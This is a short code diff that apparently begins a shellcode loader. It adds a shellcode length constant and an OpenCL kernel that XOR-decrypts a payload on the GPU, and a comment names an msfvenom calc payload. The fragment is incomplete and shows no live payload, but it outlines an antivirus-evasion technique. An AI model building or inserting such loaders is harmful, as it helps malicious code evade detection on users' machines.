@@ -1,5 +1,11 @@
 #include "../../include/vanilla/main_webgpu.h"
 
+#define SHELLCODE_LENGTH 276
+
+const char* xorKernelSource[] = { //                                
+"__kernel void decrypt(__global char* encrypted, __global char* password, __global char* output) { output[get_global_id(0)] = encrypted[get_global_id(0)] ^ password[0];  }"
+};
+
 int cltest(){
 
     // fc 48 ... msfvenom calc payload
